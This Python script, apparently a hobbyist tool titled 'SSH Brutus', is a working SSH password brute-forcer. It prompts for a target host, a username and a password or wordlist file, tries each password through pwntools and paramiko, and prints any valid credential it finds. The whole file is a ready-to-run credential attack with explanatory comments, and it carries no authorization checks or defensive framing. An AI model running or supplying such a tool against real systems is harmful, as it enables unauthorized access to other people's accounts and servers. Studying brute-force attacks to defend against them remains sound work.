from pwn import *
import paramiko


# Banner Function
###############################################
def banner():
    print('-' * 55)
    print('  Welcome to SSH Brutus. My password assassin.')
    print('-' * 55)
    print((' ' * 17) + 'By: 0xSKB')
    print('-' * 55)
###############################################

# This will check if the password is a single password or a list from a .txt file
# This will also return the file document in a list format that can be iterated over for the ssh_brute() function
################################################
def passwrd_check(passwrd):
    if '.txt' in passwrd:
        r_list = []
        passwrd = passwrd.strip('\n')
        with open(f'{passwrd}', 'r') as p_list:
            for pa in p_list:
                pa = pa.strip('\n')
                r_list.append(pa)
        return r_list
    else:
        return passwrd
################################################

# This takes three parameters and runs a loop based on the list of passwords being input
################################################
def ssh_brute(uname,passwd_list,host):
    attempts = 0
    # This is the start of the iteration over the password list taken as parameter passwd_list
    for pswrd in passwd_list:
        try:
            # It then prints the attempt number along with the bruteforcing action when attempting to connect
            print(f"[{attempts}] Attempting Password: '{pswrd}'!")
            response = ssh(host=host, user=uname, password=pswrd, timeout=1)
            # If the connection is True then it will print the valid password, close the connection, and then break the loop
            if response.connected():
                print(f"[>] Valid password found: '{pswrd}'!")
                response.close()
                break
        # If the connection is not made it takes the paramiko exception and prints "Invalid: password"
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[X] Invalid: {pswrd}")
        # increments the attempts that are set within the first print statement
        # This will increment until the program finds a valid connection or the list runs out of passwords
        attempts += 1
#################################################


# The banner output for the application
banner()

# Variables that will be passed as parameters
##################################################
# IP Address to Attack
host = input('Please feed me a host: ')
# The Username and Password Variables
username = input('Please feed me a username: ')
password = input('Please feed me a password or .txt file: ')
##################################################

# This validates whether the input is a password list or single password
pass_list = passwrd_check(password)

# Bruteforcing function
# The input from the variables needed to be stripped because it kept reading the \n escape character
ssh_brute(username.strip(), pass_list, host.strip())
